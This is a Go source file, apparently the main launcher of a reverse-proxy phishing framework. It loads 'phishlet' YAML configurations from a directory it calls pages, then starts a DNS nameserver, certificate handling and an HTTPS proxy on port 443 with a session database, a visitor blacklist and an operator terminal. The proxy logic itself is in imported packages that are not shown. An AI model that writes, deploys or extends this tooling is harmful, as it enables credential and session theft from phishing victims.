package main

import (
	"flag"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"regexp"

	"github.com/kgretzky/framework2/core"
	"github.com/kgretzky/framework2/database"
	"github.com/kgretzky/framework2/log"
)

var pages_dir = flag.String("p", "", "pages directory path")
var templates_dir = flag.String("t", "", "HTML templates directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")

func joinPath(base_path string, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

func main() {
	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	flag.Parse()
	if *pages_dir == "" {
		*pages_dir = joinPath(exe_dir, "./pages")
		if _, err := os.Stat(*pages_dir); os.IsNotExist(err) {
			*pages_dir = "/usr/share/framework/pages/"
			if _, err := os.Stat(*pages_dir); os.IsNotExist(err) {
				log.Fatal("you need to provide the path to directory where your pages are stored: ./framework -p <pages_path>")
				return
			}
		}
	}
	if *templates_dir == "" {
		*templates_dir = joinPath(exe_dir, "./templates")
		if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
			*templates_dir = "/usr/share/framework/templates/"
			if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
				*templates_dir = joinPath(exe_dir, "./templates")
			}
		}
	}
	if _, err := os.Stat(*pages_dir); os.IsNotExist(err) {
		log.Fatal("provided pages directory path does not exist: %s", *pages_dir)
		return
	}
	if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
		os.MkdirAll(*templates_dir, os.FileMode(0700))
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	pages_path := *pages_dir
	log.Info("loading pages from: %s", pages_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".framework")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	if err := core.CreateDir(crt_path, 0700); err != nil {
		log.Fatal("mkdir: %v", err)
		return
	}

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetTemplatesDir(*templates_dir)

	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return
	}

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	files, err := ioutil.ReadDir(pages_path)
	if err != nil {
		log.Fatal("failed to list pages directory '%s': %v", pages_path, err)
		return
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if rpname == nil || len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(pages_path, f.Name()), cfg)
				if err != nil {
					log.Error("failed to load page '%s': %v", f.Name(), err)
					continue
				}
				//log.Info("loaded page '%s' made by %s from '%s'", pl.Name, pl.Author, f.Name())
				cfg.AddPhishlet(pname, pl)
			}
		}
	}

	ns, _ := core.NewNameserver(cfg)
	ns.Start()
	hs, _ := core.NewHttpServer()
	hs.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)
	hp.Start()

	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	t.DoWork()
}
